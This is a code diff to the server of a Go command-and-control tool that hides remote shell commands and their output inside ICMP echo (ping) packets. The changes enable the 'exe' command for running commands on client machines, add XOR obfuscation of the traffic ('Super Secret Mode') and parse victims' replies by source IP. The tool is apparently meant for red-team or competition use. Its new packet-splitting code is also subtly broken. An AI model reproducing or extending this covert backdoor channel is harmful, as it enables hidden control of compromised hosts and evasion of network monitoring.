@@ -12,6 +12,7 @@ import (
 	"strings"
 
 	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
@@ -50,6 +51,8 @@ func print_title() {
 	fmt.Println("|  \\  \\___|  |  |  |_> >  (  (   \\  ___/\\   /|  |  |__   )  )")
 	fmt.Println("|__|\\___  |____/|   __/    \\  \\   \\___  >\\_/ |__|____/  /  /")
 	fmt.Println("        \\/      |__|        \\__\\      \\/               /__/")
+	fmt.Println("Type \"help\" for list of commands.")
+
 }
 
 func print_help() {
@@ -58,7 +61,7 @@ func print_help() {
 	fmt.Println("\trm <ID>                      Removes a client by ID")
 	fmt.Println("\tremoveallclients             Removes all clients")
 	// fmt.Println("\tsend <ID> <message>          Send message to client at ID")
-	// fmt.Println("\texe <ID> <command>           Send command to client at ID")
+	fmt.Println("\texe <ID> <command>           Send command to client at ID")
 	// fmt.Println("\tsendtoall <message>          Sends <message> to all clients")
 	// fmt.Println("\texeonall <command>           Execute <command> on all clients")
 	// fmt.Println("\tsendtoteam <team> <command>  Send <command> to all <team> clients")
@@ -67,7 +70,8 @@ func print_help() {
 	// fmt.Println("\tcheckalive                   Generates a board of replying clients")
 	// [FIX]fmt.Println("\tshell <ID>                   Creates a direct line with client at ID")
 	fmt.Println("\tkill                         Stops server")
-	// fmt.Println("\tssm                          Enables Super Secret Mode")
+	fmt.Println("\tssm                          Toggles Super Secret Mode")
+	fmt.Println("\tdebug                        Toggles Debug")
 	fmt.Println("\thelp                         Prints this")
 }
 
@@ -77,10 +81,14 @@ func addclient(ip string) {
 }
 
 func removeclient(id int) {
-	if DEBUG {
-		fmt.Println("Removing client", id)
+	if _, ok := clients[id]; ok {
+		if DEBUG {
+			fmt.Println("Removing client", id)
+		}
+		delete(clients, id)
+	} else {
+		fmt.Println("Client does not exist.")
 	}
-	delete(clients, id)
 }
 
 func removeallclients() {
@@ -100,51 +108,65 @@ func showclients() {
 	}
 }
 
-func generate_header(segments int) string {
-	segHeader := strconv.Itoa(segments)
-	header := ""
-	if SSM && execute {
-		header += "###11" + segHeader
-	} else if SSM && !execute {
-		header += "###10" + segHeader
-	} else if !SSM && execute {
-		header += "###01" + segHeader
-	} else if !SSM && !execute {
-		header += "###00" + segHeader
+func generate_header(segment int, segmented bool) string {
+	segHeader := strconv.Itoa(segment)
+	header := "###"
+	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
+	// 3 is segment for oversized packets, 4 is segment ID
+	if SSM {
+		header += "1"
 	} else {
-		fmt.Println("How")
+		header += "0"
 	}
+	if execute {
+		header += "1"
+	} else {
+		header += "0"
+	}
+	if segmented {
+		header += "1"
+	} else {
+		header += "0"
+	}
+	header += segHeader
 	return header
 }
 
 func generate_packet(payload string, segment int) {
-	// Recursivly calls generate packet if too large
 	byteSize := len(payload)
+	// Recursivly calls generate packet if too large
 	if byteSize > 1460 {
 		fmt.Println("Conductor we have a problem!!!!!")
-		firstPayload := payload[0:1460]
+		payload := payload[0:1460]
 		nextPayload := payload[1460:byteSize]
+		if SSM {
+			payload = encrypt_decrypt(payload)
+		}
 		packet := icmp.Message{
 			Type: ipv4.ICMPTypeEcho, Code: 0,
 			Body: &icmp.Echo{
-				ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
-				Data: []byte(generate_header(segment) + firstPayload),
+				ID: os.Getpid() & 0xffff, Seq: 1,
+				Data: []byte(generate_header(segment, true) + payload),
 			},
 		}
 		fmt.Println(len(PACKETQUEUE))
 		PACKETQUEUE[segment] = packet
 		generate_packet(nextPayload, segment+1)
+	} else {
+		// Packet if no segmentation is needed
+		if SSM {
+			payload = encrypt_decrypt(payload)
+		}
+		packet := icmp.Message{
+			Type: ipv4.ICMPTypeEcho, Code: 0,
+			Body: &icmp.Echo{
+				ID: os.Getpid() & 0xffff, Seq: 1,
+				Data: []byte(generate_header(segment, false) + payload),
+			},
+		}
+		fmt.Println(len(PACKETQUEUE))
+		PACKETQUEUE[segment] = packet
 	}
-
-	packet := icmp.Message{
-		Type: ipv4.ICMPTypeEcho, Code: 0,
-		Body: &icmp.Echo{
-			ID: os.Getpid() & 0xffff, Seq: 1, //<< uint(seq), // TODO
-			Data: []byte(generate_header(segment) + payload),
-		},
-	}
-	fmt.Println(len(PACKETQUEUE))
-	PACKETQUEUE[segment] = packet
 }
 
 func send_packets(addr string, c icmp.PacketConn) {
@@ -153,8 +175,6 @@ func send_packets(addr string, c icmp.PacketConn) {
 		binaryEncoding, _ := packet.Marshal(nil)
 		dst, _ := net.ResolveIPAddr("ip4", addr)
 		anInt, err := c.WriteTo(binaryEncoding, dst)
-
-		// fmt.Println(anInt, err)
 
 		if err != nil {
 			fmt.Println("I FAILED DOG")
@@ -190,15 +210,16 @@ func sniffer() {
 	source := gopacket.NewPacketSource(handler, handler.LinkType())
 	for packet := range source.Packets() {
 		payload := convert(packet.ApplicationLayer().Payload())
-		payload = payload[6:]
+		payload = payload[7:]
 
-		// fmt.Println(payload)
+		ipLayer := packet.Layer(layers.LayerTypeIPv4)
+		ip, _ := ipLayer.(*layers.IPv4)
+
 		if SSM {
-			fmt.Print((encrypt_decrypt(payload)), " received from [IP]")
+			fmt.Print((encrypt_decrypt(payload)), " received from ", ip.SrcIP)
 		} else {
-			fmt.Print((encrypt_decrypt(payload)), " received from [IP]")
+			fmt.Print((payload), " received from ", ip.SrcIP)
 		}
-
 	}
 }
 
@@ -213,12 +234,54 @@ func parse_id(id string) int {
 	return atoiclient
 }
 
+func parse_string(unparsed string) string {
+	parsed := strings.TrimRight(unparsed, "\r\n")
+	return parsed
+}
+
 func encrypt_decrypt(plaintext string) string {
 	encrypted := ""
 	for i := range plaintext {
 		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
 	}
 	return encrypted
+}
+
+func toggle_ssm() {
+	if SSM {
+		SSM = false
+		fmt.Println("SSM Disabled")
+	} else {
+		SSM = true
+		fmt.Println("SSM Enabled")
+	}
+}
+
+func toggle_debug() {
+	if DEBUG {
+		DEBUG = false
+		fmt.Println("DEBUG Disabled")
+	} else {
+		DEBUG = true
+		fmt.Println("DEBUG Enabled")
+	}
+}
+
+func checkIPAddress(host string) bool {
+	parts := strings.Split(host, ".")
+	if len(parts) < 4 {
+		return false
+	}
+	for _, x := range parts {
+		if i, err := strconv.Atoi(x); err == nil {
+			if i < 0 || i > 255 {
+				return false
+			}
+		} else {
+			return false
+		}
+	}
+	return true
 }
 
 func main() {
@@ -248,12 +311,17 @@ func main() {
 
 		if strings.HasPrefix(input, "add") {
 			tokens := strings.Split(input, " ")
-			addclient(tokens[1])
+			fmt.Println(tokens[1])
+			if checkIPAddress(parse_string(tokens[1])) {
+				addclient(tokens[1])
+			} else {
+				fmt.Println("Invalid IP address.")
+			}
 
 		} else if strings.HasPrefix(input, "rm") {
-			// tokens := strings.Split(input, " ")
-			// id := parse_id(tokens)
-			// removeclient(id)
+			tokens := strings.Split(input, " ")
+			id := parse_id(tokens[1])
+			removeclient(id)
 
 		} else if strings.HasPrefix(input, "removeallclients") {
 			removeallclients()
@@ -270,6 +338,8 @@ func main() {
 			// Create queue for packet sending
 			PACKETQUEUE = make([]icmp.Message, (len(command)/1460)+1)
 
+			execute = true
+
 			clientid := parse_id(id)
 			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 			generate_packet(command, 0)
@@ -281,12 +351,17 @@ func main() {
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
 
+		} else if strings.HasPrefix(input, "ssm") {
+			toggle_ssm()
+
+		} else if strings.HasPrefix(input, "debug") {
+			toggle_debug()
+
 		} else if strings.HasPrefix(input, "kill") {
 			print_title()
 			os.Exit(0)
 
 		} else {
-			// fmt.Println("Type \"help\" for list of commands.")
 			continue
 		}
 	}
